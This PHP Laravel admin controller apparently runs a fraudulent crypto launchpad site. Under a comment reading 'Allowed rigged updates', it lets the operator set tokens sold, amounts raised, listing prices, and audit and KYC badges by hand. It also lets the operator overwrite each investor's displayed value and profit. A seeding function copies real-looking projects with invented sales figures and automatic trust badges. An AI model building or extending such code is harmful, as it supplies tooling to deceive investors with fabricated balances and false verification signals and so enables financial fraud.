<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use App\Models\LaunchpadParticipation;
use App\Models\LaunchpadProject;
use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Validator;

class LaunchpadController extends Controller
{
    public function projectsIndex()
    {
        $projects = LaunchpadProject::orderBy('id', 'desc')->get();

        return view('admin.launchpad_projects', compact('projects'));
    }

    public function storeProject(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'name' => 'required|string',
            'symbol' => 'required|string',
            'total_supply' => 'required|numeric',
            'tokens_for_sale' => 'required|numeric',
            'price_per_token' => 'required|numeric',
            'start_date' => 'required|date',
            'end_date' => 'required|date',
        ]);

        if ($validator->fails()) {
            return back()->with('error', 'Validation failed: '.$validator->errors()->first());
        }

        $project = new LaunchpadProject;
        $project->name = $request->name;
        $project->symbol = $request->symbol;
        $project->description = $request->description;
        $project->total_supply = $request->total_supply;
        $project->tokens_for_sale = $request->tokens_for_sale;
        $project->price_per_token = $request->price_per_token;
        $project->daily_increase_percentage = $request->daily_increase_percentage ?? 0;
        $project->hard_cap = $request->hard_cap ?? 0;
        $project->soft_cap = $request->soft_cap ?? 0;
        $project->admin_allocation_pct = $request->admin_allocation_pct ?? 0;
        $project->vesting_days = $request->vesting_days ?? 0;
        $project->start_date = $request->start_date;
        $project->end_date = $request->end_date;
        $project->listing_date = $request->listing_date;
        $project->status = $request->status ?? 'upcoming';

        if ($request->hasFile('image')) {
            $imageName = time().'.'.$request->image->extension();
            $request->image->move(public_path('uploads/launchpad'), $imageName);
            $project->image = 'uploads/launchpad/'.$imageName;
        }

        $project->save();

        return back()->with('success', 'Launchpad project created successfully.');
    }

    public function updateProject(Request $request, $id)
    {
        $project = LaunchpadProject::findOrFail($id);

        // Allowed rigged updates
        if ($request->has('tokens_sold')) {
            $project->tokens_sold = $request->tokens_sold;
        }
        if ($request->has('raised_amount')) {
            $project->raised_amount = $request->raised_amount;
        }
        if ($request->has('listing_price')) {
            $project->listing_price = $request->listing_price;
        }
        if ($request->has('audit_badge')) {
            $project->audit_badge = $request->audit_badge ? true : false;
        }
        if ($request->has('kyc_verified')) {
            $project->kyc_verified = $request->kyc_verified ? true : false;
        }

        // Standard updates
        if ($request->has('name')) {
            $project->name = $request->name;
        }
        if ($request->has('symbol')) {
            $project->symbol = $request->symbol;
        }
        if ($request->has('status')) {
            $project->status = $request->status;
        }
        if ($request->has('daily_increase_percentage')) {
            $project->daily_increase_percentage = $request->daily_increase_percentage;
        }

        $project->save();

        return back()->with('success', 'Project updated successfully.');
    }

    public function destroyProject($id)
    {
        LaunchpadProject::findOrFail($id)->delete();

        return back()->with('success', 'Project deleted.');
    }

    public function participationsIndex()
    {
        $participations = LaunchpadParticipation::with(['user', 'project'])->orderBy('id', 'desc')->get();

        return view('admin.launchpad_participations', compact('participations'));
    }

    public function updateParticipation(Request $request, $id)
    {
        $participation = LaunchpadParticipation::findOrFail($id);

        if ($request->has('current_value')) {
            $participation->current_value = $request->current_value;
        }
        if ($request->has('pnl')) {
            $participation->pnl = $request->pnl;
        }
        if ($request->has('admin_status')) {
            $participation->admin_status = $request->admin_status;
        }
        if ($request->has('status')) {
            $participation->status = $request->status;
        }

        $participation->save();

        return back()->with('success', 'Participation updated successfully.');
    }

    public function syncFromBinance()
    {
        $projects = [
            [
                'name' => 'Space ID',
                'symbol' => 'ID',
                'description' => 'Web3 Identity Protocol with Multi-chain Name Service.',
                'status' => 'completed',
                'total_supply' => 2000000000,
                'tokens_for_sale' => 100000000,
                'price_per_token' => 0.025,
                'start_date' => now()->subDays(60),
                'end_date' => now()->subDays(55),
                'image' => 'https://s2.coinmarketcap.com/static/img/coins/64x64/21846.png',
            ],
            [
                'name' => 'Hooked Protocol',
                'symbol' => 'HOOK',
                'description' => 'Web3 Gamified Social Learning Platform.',
                'status' => 'completed',
                'total_supply' => 500000000,
                'tokens_for_sale' => 25000000,
                'price_per_token' => 0.1,
                'start_date' => now()->subDays(120),
                'end_date' => now()->subDays(115),
                'image' => 'https://s2.coinmarketcap.com/static/img/coins/64x64/22756.png',
            ],
            [
                'name' => 'STEPN',
                'symbol' => 'GMT',
                'description' => 'Move-to-Earn Health and Fitness App.',
                'status' => 'completed',
                'total_supply' => 6000000000,
                'tokens_for_sale' => 420000000,
                'price_per_token' => 0.01,
                'start_date' => now()->subDays(200),
                'end_date' => now()->subDays(195),
                'image' => 'https://s2.coinmarketcap.com/static/img/coins/64x64/18069.png',
            ],
            [
                'name' => 'Open Campus',
                'symbol' => 'EDU',
                'description' => 'A community-led Web3 education protocol.',
                'status' => 'active',
                'total_supply' => 1000000000,
                'tokens_for_sale' => 50000000,
                'price_per_token' => 0.05,
                'start_date' => now()->subDays(2),
                'end_date' => now()->addDays(3),
                'image' => 'https://s2.coinmarketcap.com/static/img/coins/64x64/24613.png',
            ],
            [
                'name' => 'Arkham',
                'symbol' => 'ARKM',
                'description' => 'Deanonymizing the blockchain with AI.',
                'status' => 'upcoming',
                'total_supply' => 1000000000,
                'tokens_for_sale' => 50000000,
                'price_per_token' => 0.05,
                'start_date' => now()->addDays(5),
                'end_date' => now()->addDays(10),
                'image' => 'https://s2.coinmarketcap.com/static/img/coins/64x64/25760.png',
            ],
        ];

        $count = 0;
        foreach ($projects as $p) {
            $exists = LaunchpadProject::where('symbol', $p['symbol'])->exists();
            if (! $exists) {
                $raised = $p['status'] === 'completed' ? $p['tokens_for_sale'] * $p['price_per_token'] : ($p['status'] === 'active' ? ($p['tokens_for_sale'] * $p['price_per_token'] * 0.6) : 0);
                $sold = $p['status'] === 'completed' ? $p['tokens_for_sale'] : ($p['status'] === 'active' ? ($p['tokens_for_sale'] * 0.6) : 0);

                LaunchpadProject::create([
                    'name' => $p['name'],
                    'symbol' => $p['symbol'],
                    'description' => $p['description'],
                    'total_supply' => $p['total_supply'],
                    'tokens_for_sale' => $p['tokens_for_sale'],
                    'tokens_sold' => $sold,
                    'price_per_token' => $p['price_per_token'],
                    'hard_cap' => $p['tokens_for_sale'] * $p['price_per_token'],
                    'soft_cap' => ($p['tokens_for_sale'] * $p['price_per_token']) * 0.2,
                    'raised_amount' => $raised,
                    'admin_allocation_pct' => 5,
                    'vesting_days' => 90,
                    'start_date' => $p['start_date'],
                    'end_date' => $p['end_date'],
                    'listing_date' => Carbon::parse($p['end_date'])->addDays(1),
                    'listing_price' => $p['price_per_token'] * 1.5,
                    'audit_badge' => true,
                    'kyc_verified' => true,
                    'status' => $p['status'],
                    'image' => $p['image'],
                    'buffer_percent' => 0,
                    'per_withdrawal_percent' => 0,
                ]);
                $count++;
            }
        }

        return back()->with('success', "Auto-populated $count realistic launchpad projects.");
    }

    public function triggerMarketUpdate()
    {
        Artisan::call('launchpad:market-update');
        $output = Artisan::output();

        return back()->with('success', 'Market update triggered successfully! '.$output);
    }
}
